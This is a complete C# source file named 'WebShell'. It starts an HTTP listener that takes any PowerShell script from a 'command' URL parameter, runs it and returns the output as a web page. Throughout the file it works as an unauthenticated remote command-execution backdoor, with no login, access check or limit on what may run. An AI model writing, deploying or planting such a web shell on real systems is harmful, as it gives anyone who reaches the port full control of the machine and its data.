using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Management.Automation;
using System.Net;
using System.Management.Automation.Runspaces;
using System.Net.WebSockets;
using System.Threading;
using System.Web;

namespace WebShell
{
    internal sealed class PowerShellServer
    {
        private const string CommandQueryString = "command";
        private readonly string _usageResponseString = string.Format("<HTML><BODY>http://appuri?{0}=[HtmlEncodedPowerShell]</BODY></HTML>", CommandQueryString);
        private RunspacePool _runspacePool;


        internal void Start(string listenerAddress)
        {
            InitializePowerShellPool();
            StartListener(listenerAddress);
        }

        private void InitializePowerShellPool()
        {
            var pool = RunspaceFactory.CreateRunspacePool();
            pool.Open();

            _runspacePool = pool;
        }

        public async void StartListener(string listenerAddress)
        {
            HttpListener listener = new HttpListener();
            listener.Prefixes.Add(listenerAddress);
            listener.Start();

            while (true)
            {
                try
                {
                    HttpListenerContext context = await listener.GetContextAsync();
                    
                    ProcessRequest(context);
                }
                catch (Exception e)
                {
                    Console.WriteLine("Failed in GetContextAsync" + e);
                    break;
                }
            }
        }

        private void ProcessRequest(HttpListenerContext context)
        {
            string responseString;

            string encodedCommand = context.Request.QueryString[CommandQueryString];
            string command = HttpUtility.HtmlDecode(encodedCommand);

            if (string.IsNullOrEmpty(command))
            {
                responseString = _usageResponseString;
            }
            else
            {
                string commandResult = InvokeCommand(command);
                responseString = string.Format(@"
                        <HTML>
                        <style>
                            body {{background-color:darkblue}}
                            p    {{color:white; white-space:pre-wrap; font-family:courier}}
                        </style>
                        <BODY>
                        <p>{0}</p>
                        </BODY>
                        </HTML>
                        ", commandResult);
            }

            HttpListenerResponse response = context.Response;
            byte[] buffer = System.Text.Encoding.UTF8.GetBytes(responseString);
            response.ContentLength64 = buffer.Length;
            response.OutputStream.Write(buffer, 0, buffer.Length);
            response.OutputStream.Close();
        }
        
        private string InvokeCommand(string command)
        {
            PowerShell psh = PowerShell.Create();
            psh.RunspacePool = _runspacePool;

            string commandResult = string.Empty;
            try
            {
                psh.AddScript(command, false).AddCommand("out-string").AddParameter("width", 80);
                commandResult = psh.Invoke<string>().FirstOrDefault() ?? string.Empty;

                if (psh.HadErrors)
                {
                    IEnumerable<string> errorStrings = psh.Streams.Error.ReadAll().Select(e => "ERROR: " + e.ToString() + Environment.NewLine + (e.Exception != null ? e.Exception.ToString() : string.Empty));
                    commandResult += Environment.NewLine + string.Join(Environment.NewLine, errorStrings);
                }
            }
            catch (Exception e)
            {
                commandResult += Environment.NewLine + e.ToString();
            }

            return commandResult;
        }
    }
}
